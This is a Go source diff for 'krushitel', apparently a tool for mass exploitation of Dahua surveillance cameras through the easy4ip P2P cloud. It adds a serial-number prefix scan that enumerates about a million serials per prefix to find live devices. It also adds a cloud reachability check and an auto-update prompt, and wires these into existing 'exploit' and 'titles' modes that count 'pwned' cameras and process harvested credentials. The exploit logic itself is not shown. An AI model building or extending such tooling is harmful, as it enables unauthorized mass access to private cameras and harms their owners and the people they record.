@@ -16,6 +16,7 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"net"
 	"os"
 	"os/signal"
 	"path/filepath"
@@ -28,6 +29,7 @@ import (
 	"krushitel/exploit"
 	"krushitel/fwd"
 	"krushitel/ironscan"
+	"krushitel/scanner"
 	"krushitel/ui"
 	"krushitel/update"
 )
@@ -77,10 +79,23 @@ func elapsed() string {
 	return fmt.Sprintf("%02d:%02d", m, s)
 }
 
+// cloudAlive — проб главного сервера облака Dahua: TCP-коннект за 5 сек.
+// Без сети скан/эксплойт невозможны (всё через P2P-облако) — фейлим сразу
+// и честно, вместо миллиона таймаутов.
+func cloudAlive() bool {
+	// облако Dahua говорит по UDP — TCP-проба туда лжёт, поэтому «пинг» =
+	// резолв главного сервера (DNS мёртв = сети нет; резолвится = работаем)
+	r := &net.Resolver{}
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	addrs, err := r.LookupHost(ctx, fwd.MAIN_SERVER)
+	return err == nil && len(addrs) > 0
+}
+
 func headlessUsage() {
 	fmt.Print(`krushitel headless:
   -i, --input FILE     входной файл (exploit: серийники; titles: results.txt)
-  -m, --mode MODE      exploit (по умолчанию) | titles
+  -m, --mode MODE      exploit (по умолчанию) | titles | scan
   -o, --output DIR     папка результатов (по умолчанию — имя входного файла)
   -t, --threads N      потоки (по умолчанию 30)
   -f, --fresh          игнорировать session-маркер и done.txt (прогон заново)
@@ -129,12 +144,13 @@ func runHeadless() bool {
 		out("[!] err: нужен -i/--input (файл серийников или results.txt для titles)")
 		os.Exit(2)
 	}
-	if *mode != "exploit" && *mode != "titles" {
-		out("[!] err: неизвестный режим %q — доступен exploit | titles", *mode)
+	if *mode != "exploit" && *mode != "titles" && *mode != "scan" {
+		out("[!] err: неизвестный режим %q — доступен exploit | titles | scan", *mode)
 		os.Exit(2)
 	}
 
 	ui.LoadSettings()
+	ui.ApplyLang()
 	cfg := ui.Config()
 	start = time.Now()
 
@@ -159,6 +175,14 @@ func runHeadless() bool {
 			}
 		}
 	}
+	var lastProgress time.Time
+	progress := func(done, total int64, hits string) {
+		if !tty && time.Since(lastProgress) < 30*time.Second {
+			return
+		}
+		lastProgress = time.Now()
+		render(done, total, hits)
+	}
 	renderDone := func(done, total int64, hits string) {
 		logMu.Lock()
 		defer logMu.Unlock()
@@ -175,13 +199,53 @@ func runHeadless() bool {
 		}
 	}
 
+	if !cloudAlive() {
+		out("[!] NetErr: Timeout (easy4ip) | Check your internet connection")
+		os.Exit(1)
+	}
+
 	switch *mode {
 	case "exploit":
-		os.Exit(runHeadlessExploit(cfg, *inFile, *outDir, *threads, *fresh, render, renderDone))
+		os.Exit(runHeadlessExploit(cfg, *inFile, *outDir, *threads, *fresh, progress, renderDone))
 	case "titles":
-		os.Exit(runHeadlessTitles(cfg, *inFile, *threads, render, renderDone))
+		os.Exit(runHeadlessTitles(cfg, *inFile, *threads, progress, renderDone))
+	case "scan":
+		os.Exit(runHeadlessScan(cfg, *inFile, *outDir, *threads, progress, renderDone))
 	}
 	return true
+}
+
+// headlessBanner — баннер + автоапдейт: есть релиз свежее — вопрос y/n,
+// согласие = Install + перезапуск с теми же флагами (restart делает exec).
+func headlessBanner(online bool) {
+	now := time.Now().Format("15:04")
+	if !online {
+		out("[%s] krushitel v%s-beta", now, update.CurrentVersion)
+		return
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
+	defer cancel()
+	rel, err := update.Check(ctx)
+	if err != nil || rel == nil {
+		out("[%s] krushitel v%s-beta (latest)", now, update.CurrentVersion)
+		return
+	}
+	out("[%s] krushitel v%s-beta", now, update.CurrentVersion)
+	out("new update! (v%s)", rel.Version)
+	out("do you want to update? (y/n)")
+	var ans string
+	_, _ = fmt.Scanln(&ans)
+	ans = strings.ToLower(strings.TrimSpace(ans))
+	if ans != "y" && ans != "yes" {
+		return
+	}
+	out("updating to v%s...", rel.Version)
+	update.Install(context.Background(), rel)
+	if err := update.Restart(os.Stdout, os.Stderr); err != nil {
+		out("[!] err: перезапуск не вышел: %v", err)
+		os.Exit(1)
+	}
+	os.Exit(0)
 }
 
 // headlessLogOpen — log.txt рядом с результатами (append между прогонами).
@@ -251,7 +315,7 @@ func resumeFilter(serials []string, outDir string, fresh bool) ([]string, bool) 
 }
 
 func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fresh bool,
-	render func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
+	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
 	serials, err := exploit.LoadSerials(inFile)
 	if err != nil {
 		out("[!] err: входной файл: %v", err)
@@ -273,7 +337,7 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 	unhook := wireHooks(cfg)
 	defer unhook()
 
-	out("[%s] krushitel v%s-beta (latest)", time.Now().Format("15:04"), update.CurrentVersion)
+	headlessBanner(true)
 	out("started exploiting %d SNs", len(serials))
 	out("saving results at //%s", outDir)
 
@@ -309,7 +373,7 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 		for {
 			select {
 			case <-ticker.C:
-				render(stats.Processed, stats.Total, fmt.Sprintf("pwned: %d", stats.Pwned))
+				progress(stats.Processed, stats.Total, fmt.Sprintf("pwned: %d", stats.Pwned))
 			case <-doneEvents:
 				return
 			}
@@ -348,7 +412,7 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 }
 
 func runHeadlessTitles(cfg ui.Settings, inFile string, threads int,
-	render func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
+	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
 	cams, skipped, err := exploit.ParseResultsCreds(inFile)
 	if err != nil {
 		out("[!] err: входной файл: %v", err)
@@ -364,7 +428,7 @@ func runHeadlessTitles(cfg ui.Settings, inFile string, threads int,
 	unhook := wireHooks(cfg)
 	defer unhook()
 
-	out("[%s] krushitel v%s-beta (latest)", time.Now().Format("15:04"), update.CurrentVersion)
+	headlessBanner(true)
 	out("started titling %d cams", len(cams))
 	if skipped > 0 {
 		out("skipped %d lines", skipped)
@@ -390,7 +454,7 @@ func runHeadlessTitles(cfg ui.Settings, inFile string, threads int,
 		for {
 			select {
 			case <-ticker.C:
-				render(stats.Processed, stats.Total, fmt.Sprintf("titled: %d", stats.Titled))
+				progress(stats.Processed, stats.Total, fmt.Sprintf("titled: %d", stats.Titled))
 			case <-doneEvents:
 				return
 			}
@@ -412,6 +476,96 @@ func runHeadlessTitles(cfg ui.Settings, inFile string, threads int,
 		return 1
 	}
 	out("titles finished")
+	if ctx.Err() != nil {
+		return 130
+	}
+	return 0
+}
+
+// runHeadlessScan — префиксный скан: -i файл с префиксами (>=10 символов,
+// берутся первые 10) или одиночный префикс; -o файл живых серийников.
+func runHeadlessScan(cfg ui.Settings, inFile, outFile string, threads int,
+	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
+	var prefixes []string
+	if _, err := os.Stat(inFile); err == nil {
+		data, rerr := os.ReadFile(inFile)
+		if rerr != nil {
+			out("[!] err: входной файл: %v", rerr)
+			return 2
+		}
+		for _, line := range strings.Split(string(data), "\n") {
+			line = strings.TrimSpace(line)
+			if len(line) >= 10 {
+				prefixes = append(prefixes, line[:10])
+			}
+		}
+	} else if t := strings.TrimSpace(inFile); len(t) >= 10 {
+		prefixes = []string{t[:10]}
+	} else {
+		out("[!] err: входной файл с префиксами не найден: %s", inFile)
+		return 2
+	}
+	if len(prefixes) == 0 {
+		out("[!] err: префиксов в файле нет (нужно >= 10 символов, берутся первые 10)")
+		return 2
+	}
+	if outFile == "" {
+		outFile = strings.TrimSuffix(filepath.Base(inFile), filepath.Ext(inFile)) + "_alive.txt"
+	}
+	if threads <= 0 {
+		threads = 30
+	}
+
+	headlessLogOpen(strings.TrimSuffix(outFile, filepath.Ext(outFile)) + ".log")
+	scanner.Debug = cfg.Debug
+	scanner.LogHook = func(line string) { flog("%s", line) }
+	defer func() { scanner.LogHook = nil }()
+
+	headlessBanner(true)
+	totalSNs := int64(len(prefixes)) * 1048576
+	out("started scanning %d prefixes | %d SNs", len(prefixes), totalSNs)
+	out("saving results at //%s", outFile)
+
+	// недобитый скан? чекпоинт в <outFile>.state — продолжаем
+	if info, ok := scanner.CheckPrefixResume(outFile); ok {
+		flog("resume скана: %s", info)
+	}
+
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
+	defer stop()
+
+	stats := &scanner.ScanStats{}
+	events := make(chan string, 1024)
+	doneEvents := make(chan struct{})
+	go func() {
+		for line := range events {
+			flog("%s", line)
+		}
+	}()
+	go func() {
+		ticker := time.NewTicker(500 * time.Millisecond)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				progress(stats.Checked, stats.Total, fmt.Sprintf("found: %d", stats.Alive))
+			case <-doneEvents:
+				return
+			}
+		}
+	}()
+
+	scanner.RunPrefixes(ctx, prefixes, outFile, false, false, threads, stats, events)
+
+	close(doneEvents)
+	close(events)
+	renderDone(stats.Checked, stats.Total, fmt.Sprintf("found: %d", stats.Alive))
+
+	if stats.ErrorMsg != "" {
+		out("[!] err: %s", stats.ErrorMsg)
+		return 1
+	}
+	out("scan finished")
 	if ctx.Err() != nil {
 		return 130
 	}
